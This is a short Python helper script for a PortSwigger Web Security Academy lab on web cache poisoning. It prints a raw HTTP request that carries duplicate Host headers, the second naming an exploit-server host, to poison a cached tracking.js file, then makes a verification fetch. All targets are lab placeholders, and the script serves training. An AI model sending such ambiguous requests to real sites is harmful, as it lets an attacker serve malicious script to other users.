"""
Lab 8: Web cache poisoning via ambiguous requests
https://portswigger.net/web-security/host-header/exploiting/lab-host-header-web-cache-poisoning-via-ambiguous-requests
Difficulty: Practitioner

📝 Same lab as Host Header Attacks module's Lab 3 — cross-listed here
since it's also a canonical web-cache-poisoning technique. See that
module's lab03 script for the full raw-request approach (duplicate Host
headers), reproduced in brief below.
"""

from utils import get_session, log, note

TARGET = "https://YOUR-LAB-ID.web-security-academy.net"
REAL_HOST = "YOUR-LAB-ID.web-security-academy.net"
MALICIOUS_HOST = "exploit-YOUR-LAB-ID.exploit-server.net"


def run():
    note("This lab needs two literal Host: header lines in one request —")
    note("requests/urllib3 don't cleanly support that through the high-")
    note("level API, so (as in the Host Header module) this is genuinely")
    note("simpler to do directly in Burp Repeater. Raw shape to send:")
    print(f"""
GET /resources/js/tracking.js HTTP/1.1
Host: {REAL_HOST}
Host: {MALICIOUS_HOST}

""")
    note("See host-header-attacks/lab03_cache_poisoning_ambiguous_requests.py")
    note("if you've already built that module — same technique, same target")
    note("concept, just filed under this module's numbering too.")

    s = get_session()
    r = s.get(f"{TARGET}/resources/js/tracking.js")
    log(f"Verification fetch status: {r.status_code}")


if __name__ == "__main__":
    run()
